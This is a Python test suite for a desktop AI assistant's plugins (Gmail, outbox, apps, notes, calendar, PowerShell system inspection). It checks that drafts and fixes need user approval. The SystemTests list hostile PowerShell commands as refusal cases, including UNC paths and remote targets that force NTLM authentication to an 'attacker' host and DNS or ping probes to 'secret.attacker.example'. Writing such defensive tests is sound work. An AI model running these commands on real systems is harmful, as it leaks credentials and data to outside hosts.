from datetime import date, datetime, timedelta, timezone
from pathlib import Path
import sys
import tempfile
import time
import unittest
from unittest.mock import Mock, patch

from PySide6.QtCore import QCoreApplication
from ano.plugins.apps import Apps
from ano.plugins.mail import Gmail, Outbox, html_text
from ano.plugins.media import Media
from ano.plugins.notes import Notebook
from ano.plugins.schedule import GoogleCalendar
from ano.plugins.system import Fixes, System
from ano.tools import ToolError, Toolbox

HEADER = b'From: Example Sender <sender@example.com>\r\nSubject: Example invoice\r\nDate: Mon, 26 Oct 2026 09:00:00 +0000\r\n\r\n'
MESSAGE = (b'From: Example Sender <sender@example.com>\r\nTo: me@example.com\r\nSubject: Example invoice\r\n'
           b'Message-ID: <original@example.com>\r\nContent-Type: text/html\r\n\r\n'
           b'<p>Hello</p><script>hidden()</script><p>Total due</p>')


class FakeImap:
    def __init__(self, *args, **kwargs):
        self.commands = []

    def __enter__(self):
        return self

    def __exit__(self, *args):
        pass

    def login(self, *args):
        pass

    def list(self):
        return 'OK', [b'(\\HasNoChildren) "/" "INBOX"', b'(\\All \\HasNoChildren) "/" "[Gmail]/All Mail"']

    def select(self, mailbox, readonly=False):
        self.commands.append(('select', mailbox, readonly))

    def uid(self, command, *args):
        self.commands.append((command,) + args)
        if command == 'SEARCH':
            return 'OK', [b'7 8 9']
        if 'BODY.PEEK[]' in args[-1]:
            return 'OK', [(b'9 (UID 9 BODY[] {100}', MESSAGE), b')']
        return 'OK', [(b'9 (UID 9 BODY[HEADER] {80}', HEADER), b')', (b'8 (UID 8 BODY[HEADER] {80}', HEADER), b')']


class GmailTests(unittest.TestCase):
    def setUp(self):
        self.imap = FakeImap()
        patcher = patch('ano.plugins.mail.imaplib.IMAP4_SSL', return_value=self.imap)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.outbox = Mock()
        self.gmail = Gmail('me@example.com', 'app-password', self.outbox)

    def test_search_is_read_only_newest_first_in_all_mail(self):
        text, note = self.gmail.run('search_email', {'query': 'invoice', 'limit': 2})
        self.assertEqual(self.imap.commands[0], ('select', '"[Gmail]/All Mail"', True))
        self.assertEqual(self.imap.commands[1], ('SEARCH', 'X-GM-RAW', '"invoice"'))
        self.assertIn('PEEK', self.imap.commands[2][-1])
        self.assertEqual(self.imap.commands[2][1], '9,8')
        self.assertTrue(text.startswith('id 9 · '))
        self.assertIn('Example invoice', text)

    def test_read_strips_html_scripts(self):
        text, note = self.gmail.run('read_email', {'id': '9'})
        self.assertIn('Subject: Example invoice', text)
        self.assertIn('Hello', text)
        self.assertNotIn('hidden', text)
        self.assertEqual(note, 'Read email “Example invoice”')

    def test_send_only_proposes_a_threaded_draft(self):
        text, _ = self.gmail.run('send_email', {'to': 'Alex <alex@example.com>, not-an-address', 'subject': 'Re:\n x',
                                                'body': 'Thanks', 'reply_to_id': '9'})
        draft = self.outbox.propose.call_args.args[0]
        self.assertEqual(draft['to'], 'alex@example.com')
        self.assertEqual(draft['subject'], 'Re: x')
        self.assertEqual(draft['inReplyTo'], '<original@example.com>')
        self.assertIn('NOT been sent', text)

    def test_html_text(self):
        self.assertEqual(html_text('<div>A</div><style>x</style><br>B'), '\nA\nB')


class OutboxTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.app = QCoreApplication.instance() or QCoreApplication([])

    def wait(self, predicate):
        deadline = time.monotonic() + 3
        while not predicate() and time.monotonic() < deadline:
            self.app.processEvents()
            time.sleep(.005)
        self.assertTrue(predicate())

    def test_nothing_is_delivered_without_send_and_pause_blocks(self):
        allowed = [True]
        delivered = []
        statuses = []
        outbox = Outbox(lambda: allowed[0])
        outbox.deliver = delivered.append
        outbox.finished.connect(statuses.append)
        draft = {'to': 'alex@example.com', 'cc': '', 'subject': 'Hi', 'body': 'Draft', 'inReplyTo': '', 'references': ''}
        outbox.propose(draft)
        self.wait(lambda: outbox.ready)
        self.assertEqual(delivered, [])
        allowed[0] = False
        outbox.send('Hi', 'Edited')
        self.assertEqual(delivered, [])
        allowed[0] = True
        outbox.send('Hi', 'Edited')
        self.wait(lambda: not outbox.ready)
        outbox.close()
        self.assertEqual(delivered[0]['body'], 'Edited')
        self.assertEqual(statuses, ['Email sent to alex@example.com'])
        outbox.propose(draft)
        self.wait(lambda: outbox.ready)
        outbox.discard()
        self.assertFalse(outbox.ready)
        self.assertEqual(len(delivered), 1)


class AppsTests(unittest.TestCase):
    def setUp(self):
        self.launch = Mock()
        listing = lambda: [{'Name': 'Spotify', 'AppID': 'Spotify.Id'}, {'Name': 'Word', 'AppID': 'Word.Id'},
                           {'Name': 'WordPad', 'AppID': 'WordPad.Id'}, {'Name': 'Uninstall Spotify', 'AppID': 'U'},
                           {'Name': 'Microsoft Edge', 'AppID': 'Edge.Id'}, {'Name': 'Microsoft Teams', 'AppID': 'T'}]
        self.toolbox = Toolbox(lambda: [], plugins=[Apps(listing, self.launch)])

    def test_exact_and_partial_names(self):
        self.assertFalse(self.toolbox.run('open_app', {'name': 'spotify'})[2])
        self.launch.assert_called_once_with('shell:AppsFolder\\Spotify.Id')
        self.assertFalse(self.toolbox.run('open_app', {'name': 'word'})[2])
        self.launch.assert_called_with('shell:AppsFolder\\Word.Id')
        self.assertFalse(self.toolbox.run('open_app', {'name': 'edge'})[2])

    def test_ambiguous_or_missing_names_launch_nothing(self):
        text, _, failed = self.toolbox.run('open_app', {'name': 'microsoft'})
        self.assertTrue(failed)
        self.assertIn('Microsoft Edge, Microsoft Teams', text)
        self.assertTrue(self.toolbox.run('open_app', {'name': 'nonexistent'})[2])
        self.launch.assert_not_called()


class MediaTests(unittest.TestCase):
    def test_keys_and_volume_steps(self):
        pressed = []
        media = Media(pressed.append)
        media.run('media_control', {'action': 'play_pause'})
        media.run('media_control', {'action': 'volume_up', 'steps': 99})
        self.assertEqual(pressed, [0xB3] + [0xAF] * 25)


class NotebookTests(unittest.TestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.now = datetime(2026, 10, 25, 12, 0, tzinfo=timezone.utc)
        self.notebook = Notebook(Path(self.directory.name) / 'memory.sqlite3', lambda: self.now)

    def tearDown(self):
        self.directory.cleanup()

    def test_notes(self):
        self.notebook.run('add_note', {'text': 'Example wifi code'})
        self.notebook.run('add_note', {'text': 'Shopping list'})
        self.assertIn('wifi', self.notebook.run('search_notes', {'query': 'WIFI'})[0])
        self.notebook.run('delete_note', {'id': 1})
        self.assertNotIn('wifi', self.notebook.run('search_notes', {})[0])

    def test_reminders_fire_once(self):
        due = (self.now + timedelta(minutes=30)).astimezone().strftime('%Y-%m-%dT%H:%M')
        self.notebook.run('add_reminder', {'text': 'Example call', 'when': due})
        self.assertEqual(self.notebook.take_due(), [])
        self.now += timedelta(hours=1)
        self.assertEqual([text for text, _ in self.notebook.take_due()], ['Example call'])
        self.assertEqual(self.notebook.take_due(), [])

    def test_past_reminder_is_refused(self):
        toolbox = Toolbox(lambda: [], plugins=[self.notebook])
        self.assertTrue(toolbox.run('add_reminder', {'text': 'Late', 'when': '2020-01-01T09:00'})[2])

    def test_relative_reminders_are_computed_by_the_tool(self):
        start = datetime(2026, 10, 26, 13, 14, tzinfo=timezone.utc)
        notebook = Notebook(Path(self.directory.name) / 'relative.sqlite3', clock=lambda: start)
        text, _ = notebook.add_reminder('Stretch', in_minutes=10)
        self.assertEqual(text, f'Reminder 1 set for {(start + timedelta(minutes=10)).astimezone():%a %d %b %H:%M}.')
        for bad in ({'in_minutes': 0}, {'in_minutes': 20000}, {'in_minutes': 5, 'when': '2026-10-27T09:00'}, {}):
            with self.subTest(arguments=bad), self.assertRaises(ToolError):
                notebook.add_reminder('Stretch', **bad)


class CalendarTests(unittest.TestCase):
    ICS = b'''BEGIN:VCALENDAR
VERSION:2.0
BEGIN:VEVENT
UID:1
DTSTART:20261026T090000Z
DTEND:20261026T100000Z
SUMMARY:Example standup
RRULE:FREQ=DAILY;COUNT=3
END:VEVENT
BEGIN:VEVENT
UID:2
DTSTART;VALUE=DATE:20261027
SUMMARY:Example holiday
END:VEVENT
END:VCALENDAR
'''

    def test_recurring_events_are_listed(self):
        calendar = GoogleCalendar('https://example.com/basic.ics', Mock(), lambda url: self.ICS,
                                  lambda: date(2026, 10, 25))
        text, _ = calendar.run('calendar_events', {'days': 7})
        self.assertEqual(text.count('Example standup'), 3)
        self.assertIn('Tue 27 Oct (all day) · Example holiday', text)

    def test_adding_opens_prefilled_page_only(self):
        open_url = Mock(return_value=True)
        calendar = GoogleCalendar(None, open_url)
        calendar.run('add_calendar_event', {'title': 'Dentist', 'start': '2026-10-27T14:30'})
        url = open_url.call_args.args[0]
        self.assertIn('action=TEMPLATE', url)
        self.assertIn('dates=20261027T143000%2F20261027T153000', url)
        toolbox = Toolbox(lambda: [], plugins=[calendar])
        text, _, failed = toolbox.run('calendar_events', {})
        self.assertTrue(failed)
        self.assertIn('configure calendar', text)

class SystemTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.app = QCoreApplication.instance() or QCoreApplication([])

    def test_overview_reports_real_machine(self):
        text, note = System(None).system_overview()
        self.assertIn('CPU use:', text)
        self.assertIn('Busiest by memory:', text)
        self.assertNotIn('System Idle Process', text)

    def test_inspect_passes_command_to_filter_and_reports_refusals(self):
        calls = []
        def run(script, timeout, environment):
            calls.append(environment)
            return 0, 'ANO-REFUSED: \'Stop-Process\' is not a read-only command.' if 'Stop' in environment['ANO_INSPECT'] else 'Name  Id'
        toolbox = Toolbox(lambda: [], plugins=[System(None, run)])
        text, note, failed = toolbox.run('inspect_system', {'command': 'Get-Process | Select-Object -First 1'})
        self.assertEqual((text, failed), ('Name  Id', False))
        self.assertIn('Get-Process', calls[0]['ANO_ALLOWED'])
        self.assertNotIn('Stop-Process', calls[0]['ANO_ALLOWED'].split())
        text, _, failed = toolbox.run('inspect_system', {'command': 'Stop-Process -Name x'})
        self.assertTrue(failed)
        self.assertIn('propose_fix', text)

    @unittest.skipUnless(sys.platform == 'win32', 'needs Windows PowerShell')
    def test_inspect_refuses_network_and_remote_targets_in_real_powershell(self):
        # Each would make Windows connect and authenticate (NTLM) to another machine.
        system = System(None)
        for command in (r'Get-ChildItem \\attacker\share', r'Get-Item -LiteralPath "\\?\UNC\attacker\s"',
                        r'Get-ChildItem FileSystem::\\attacker\share', 'Get-Service -cn attacker',
                        'Get-CimInstance Win32_OperatingSystem -CimS attacker',
                        r'Get-WmiObject -Names \\attacker\root\cimv2 -Class Win32_OperatingSystem',
                        r'Get-Counter "\\attacker\Processor(_Total)\% Processor Time"',
                        'Get-WinEvent -FilterHashtable @{Path="x.evtx"}', r'$p = "\\attacker\s"; Get-ChildItem $p',
                        r'Get-ChildItem ("\" + "\attacker\s")', '$a = @{Path="x"}; Get-ChildItem @a',
                        'Get-Process | Select-Object @{n="ComputerName";e={"attacker"}} | Get-Service',
                        r'Get-ChildItem WSMan:\attacker', 'Test-Connection -ComputerName x -Source attacker'):
            with self.subTest(command=command), self.assertRaises(ToolError):
                system.inspect_system(command)
        for command in ('Get-Date', r'Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"',
                        'Get-WinEvent -FilterHashtable @{LogName="System"} -MaxEvents 1 | Select-Object Id',
                        'Get-ScheduledTask | Select-Object -First 1 TaskName'):
            with self.subTest(command=command):
                output, _ = system.inspect_system(command)
                self.assertNotIn('CLIXML', output)

    @unittest.skipUnless(sys.platform == 'win32', 'needs Windows PowerShell')
    def test_network_probes_to_unfamiliar_hosts_need_approval_in_real_powershell(self):
        outbound = Mock()
        outbound.check_hosts.side_effect = ToolError('The user cancelled, stopped, or did not approve this action.')
        system = System(None, outbound=outbound)
        with self.assertRaisesRegex(ToolError, 'did not approve'):
            system.inspect_system('Resolve-DnsName -Name secret.attacker.example')
        outbound.check_hosts.assert_called_once_with(['secret.attacker.example'])
        for command in ('$h = "x.attacker.example"; Test-Connection $h -Count 1',
                        'Get-CimInstance -ClassName Win32_PingStatus -Filter "Address=\'x.attacker.example\'"',
                        'Test-Connection "a b" -Count 1'):
            with self.subTest(command=command), self.assertRaises(ToolError):
                system.inspect_system(command)
        outbound.check_hosts.reset_mock()
        output, _ = system.inspect_system('Test-Connection 127.0.0.1 -Count 1 -Quiet')
        self.assertIn('True', output)
        outbound.check_hosts.assert_not_called()

    def test_approved_probe_hosts_are_passed_to_the_second_run(self):
        calls = []
        def run(script, timeout, environment):
            calls.append(environment['ANO_PROBE_HOSTS'].split())
            return 0, 'ANO-PROBE: printer.example.net' if len(calls) == 1 else 'Reply from printer'
        outbound = Mock()
        output, _ = System(None, run, outbound).inspect_system('Test-Connection printer.example.net -Count 1')
        self.assertEqual(output, 'Reply from printer')
        outbound.check_hosts.assert_called_once_with(['printer.example.net'])
        self.assertNotIn('printer.example.net', calls[0])
        self.assertIn('printer.example.net', calls[1])

    def test_fix_runs_only_after_run_and_never_while_paused(self):
        allowed = [True]
        ran, results = [], []
        fixes = Fixes(lambda: allowed[0], runner=lambda fix: ran.append(fix) or 'done')
        fixes.finished.connect(lambda title, output: results.append((title, output)))
        system = System(fixes)
        text, note = system.propose_fix('Restart Example service', 'Restarts it.', 'Restart-Service Example', admin=True)
        self.assertIn('NOT run', text)
        deadline = time.monotonic() + 3
        while not fixes.ready and time.monotonic() < deadline:
            self.app.processEvents()
        self.assertTrue(fixes.ready and fixes.fix['admin'])
        self.assertEqual(ran, [])
        allowed[0] = False
        fixes.run()
        self.assertEqual(ran, [])
        allowed[0] = True
        fixes.run()
        while not results and time.monotonic() < deadline:
            self.app.processEvents()
        fixes.close()
        self.assertEqual(results, [('Restart Example service', 'done')])
        self.assertFalse(fixes.ready)
